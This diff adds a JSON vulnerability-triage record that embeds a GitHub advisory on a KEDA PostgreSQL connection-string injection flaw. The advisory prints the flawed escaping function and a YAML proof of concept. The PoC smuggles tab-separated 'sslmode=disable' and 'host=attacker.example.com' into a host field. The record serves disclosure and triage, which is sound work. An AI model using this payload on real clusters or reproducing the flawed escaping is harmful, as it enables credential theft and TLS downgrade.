@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/90008958?v=4\", \"events_url\": \"https://api.github.com/users/mert2m/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/mert2m/followers\", \"following_url\": \"https://api.github.com/users/mert2m/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/mert2m/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/mert2m\", \"id\": 90008958, \"login\": \"mert2m\", \"node_id\": \"MDQ6VXNlcjkwMDA4OTU4\", \"organizations_url\": \"https://api.github.com/users/mert2m/orgs\", \"received_events_url\": \"https://api.github.com/users/mert2m/received_events\", \"repos_url\": \"https://api.github.com/users/mert2m/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/mert2m/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/mert2m/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/mert2m\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-53572\", \"cvss\": {\"score\": 5.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.9, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-74\", \"name\": \"Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\"}, {\"cwe_id\": \"CWE-89\", \"name\": \"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"}], \"description\": \"### Summary\\n`pkg/scalers/postgresql_scaler.go` builds libpq-style connection strings by concatenating `key=value` pairs separated by spaces. Each tenant-controllable field (`host`, `port`, `userName`, `dbName`, `sslmode`) is passed through `escapePostgreConnectionParameter`:\\n```go\\nfunc escapePostgreConnectionParameter(str string) string {\\n    if !strings.Contains(str, \\\" \\\") {\\n        return str       // returned as-is for any non-space whitespace\\n    }\\n    str = strings.ReplaceAll(str, \\\"'\\\", \\\"\\\\\\\\'\\\")\\n    return fmt.Sprintf(\\\"'%s'\\\", str)\\n}\\n```\\nThe function only escapes when a literal **space** is present. Per libpq/pgx documentation, parameters are also separated by **tabs, newlines, carriage returns, and form feeds**, and backslashes are parsed inside quoted strings. Because those characters are not detected, a tenant-supplied value like `mydb\\\\tsslmode=disable\\\\thost=attacker.example.com` splits into additional `key=value` tokens when parsed by pgx, injecting attacker-controlled connection parameters.\\n\\n### Vulnerable code\\n`pkg/scalers/postgresql_scaler.go`, lines 155–164 and 250–257.\\n\\n### Impact\\nTenants with the ability to create a `TriggerAuthentication` or `ScaledObject` that populates any of `host`, `port`, `userName`, `dbName`, `sslmode` can:\\n- **Force `sslmode=disable`** on a connection that the cluster owner intended to be TLS-only — silently downgrading to plaintext and enabling on-path MitM.\\n- **Redirect the connection to an attacker-controlled host** (`host=...`) to steal the credentials the operator supplies via the `password=` keyword.\\n- Append arbitrary libpq runtime parameters (`options=`, `application_name=`, `target_session_attrs=`) to pivot behavior.\\n\\nNote: the password parameter is appended **last** in `buildConnArray`, which limits but does not eliminate credential exfiltration — injected `host=` still redirects the subsequent `password=` keyword's target.\\n\\n### Proof of concept\\n```yaml\\ntriggers:\\n- type: postgresql\\n  metadata:\\n    host: \\\"legit.db.svc\\\\tsslmode=disable\\\\thost=attacker.example.com\\\"\\n    port: \\\"5432\\\"\\n    userName: \\\"keda\\\"\\n    dbName: \\\"metrics\\\"\\n    sslmode: \\\"require\\\"\\n    query: \\\"SELECT 1\\\"\\n```\\nAfter `escapePostgreConnectionParameter` (no space → returned unchanged), the resulting connection string is parsed by pgx into parameters that include `host=attacker.example.com` and `sslmode=disable`.\\n\\n### Suggested fix\\n- Escape / reject any ASCII whitespace (`\\\\t`, `\\\\n`, `\\\\r`, `\\\\f`, `\\\\v`, space) and backslash.\\n- Prefer the URI form (`postgres://user:pass@host:port/db?sslmode=require`) with proper URL-encoding.\\n- Validate each field against an allow-list pattern before use.\\n\\n### Resources\\n- `pkg/scalers/postgresql_scaler.go`\\n- libpq connection string parsing: https://www.postgresql.org/docs/current/libpq-connect.html#LIBPQ-CONNSTRING\", \"ghsa_id\": \"GHSA-6w3m-4hhp-775q\", \"github_reviewed_at\": \"2026-07-07T23:44:13Z\", \"html_url\": \"https://github.com/advisories/GHSA-6w3m-4hhp-775q\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-6w3m-4hhp-775q\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-53572\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-07T23:44:13Z\", \"references\": [\"https://github.com/kedacore/keda/security/advisories/GHSA-6w3m-4hhp-775q\", \"https://github.com/advisories/GHSA-6w3m-4hhp-775q\"], \"repository_advisory_url\": \"https://api.github.com/repos/kedacore/keda/security-advisories/GHSA-6w3m-4hhp-775q\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/kedacore/keda\", \"summary\": \"KEDA has PostgreSQL connection string parameter injection via incomplete whitespace escaping\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-07T23:44:14Z\", \"url\": \"https://api.github.com/advisories/GHSA-6w3m-4hhp-775q\", \"vulnerabilities\": [{\"first_patched_version\": \"2.20.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/kedacore/keda/v2\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.20.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-6w3m-4hhp-775q",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/kedacore/keda/v2: < 2.20.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-53572"
+    ],
+    "cvss_score": 5.9,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/kedacore/keda/v2"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.667380Z",
+  "provenance": {
+    "content_sha256": "534694f89f6ce85dd02dd52b772061ea0f20ec25032deb1a067ad90f4d13ccc5",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-07T23:44:13Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-6w3m-4hhp-775q",
+  "status": "active",
+  "title": "KEDA has PostgreSQL connection string parameter injection via incomplete whitespace escaping",
+  "updated_at": "2026-07-07T23:44:14Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-6w3m-4hhp-775q"
+}
